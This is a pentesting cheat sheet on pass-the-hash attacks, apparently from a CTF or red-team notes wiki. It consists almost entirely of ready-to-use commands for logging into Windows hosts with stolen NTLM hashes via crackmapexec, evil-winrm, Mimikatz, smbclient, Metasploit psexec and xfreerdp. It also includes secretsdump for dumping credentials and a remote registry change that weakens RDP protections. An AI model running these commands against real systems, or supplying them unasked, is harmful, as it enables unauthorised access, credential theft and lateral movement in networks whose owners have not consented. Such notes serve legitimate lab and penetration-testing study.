# Pass The Hash

#### Hash reference

**URL:** [https://d00mfist1.gitbooks.io/ctf/content/identify\_hash\_and\_crack\_it/ntlm-vs-ntlmv1v2-aka-net-ntlmv1v2.html](https://d00mfist1.gitbooks.io/ctf/content/identify\_hash\_and\_crack\_it/ntlm-vs-ntlmv1v2-aka-net-ntlmv1v2.html)

## Techniques

### Crackmapexec

```bash
crackmapexec smb <IP> -u <User> -H <NTLM>
crackmapexec smb '10.10.10.10' -u 'moe' -H 'b38ff50264b7458734d82c69794a4d8'

# local account login
crackmapexec smb <IP> -u <User> -H <NTLM> --local-auth
crackmapexec smb '10.10.10.10' -u 'moe' -H 'b38ff50264b7458734d82c69794a4d8' --local-auth
```

### Evil-WinRM

```bash
evil-winrm -i <IP> -u <User> -H <NThash>
evil-winrm -i '10.10.10.10' -u 'moe' -H 'b38ff50264b7458734d82c69794a4d8'
```

### LDAP

```bash
secretsdump.py <User>@<IP> -hashes <Hash>
secretsdump.py moe@10.10.10.10 -hashes aad321b35b51404eeaad982b5b51404ee:b38ff50264b7458734d82c69794a4d8
```

### Mimikatz

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTLM> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:b38ff50264b7458734d82c69794a4d8 /run:powershell.exe"'
```

### Metasploit

```
use exploit/windows/smb/psexec
```

### smbclient

```bash
smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
smbclient '//10.0.0.10/IT' -U 'moe' --pw-nt-hash 'b38ff50264b7458734d82c69794a4d8' -W 'security.local'
```

### xFreeRDP

This method requires "Restricted Admin Mode" enabled on the target system.

```bash
xfreerdp /v:10.10.10.10 /u:moe /pth:b38ff50264b7458734d82c69794a4d8
```

```bash
# Enable restricted admin mode, requires elevated permissions.
crackmapexec '10.10.10.10' -u 'moe' -H 'b38ff50264b7458734d82c69794a4d8' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
